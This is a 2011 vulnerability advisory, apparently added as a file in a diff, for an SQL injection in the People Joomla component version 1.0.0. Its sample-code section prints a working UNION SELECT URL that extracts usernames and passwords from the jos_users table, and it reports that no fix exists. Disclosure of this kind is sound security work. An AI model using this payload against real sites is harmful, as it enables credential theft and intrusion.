@@ -1,0 +1,63 @@
+People Joomla Component 1.0.0 SQL Injection Vulnerability
+
+ Name              People
+ Vendor            http://www.ptt-solution.com
+ Versions Affected 1.0.0
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2011-01-14
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+The component shows all of your people in a  professional
+scroll  bar  where  visitors  take the first attention to
+their looks and positions.
+
+
+II. DESCRIPTION
+_______________
+
+A parameter is not properly sanitised  before  being used
+in SQL queries.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) SQL Injection
+ 
+
+A) SQL Injection
+________________
+
+The id parameter is not  properly  sanitised before being
+used in SQL queries.  This can be exploited to manipulate
+SQL queries by injecting arbitrary SQL code.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) SQL Injection
+
+http://site/path/index.php?option=com_people&controller=people&task=details&id=-1 UNION SELECT username,password,3 FROM jos_users
+
+
+V. FIX
+______
+
+No fix.
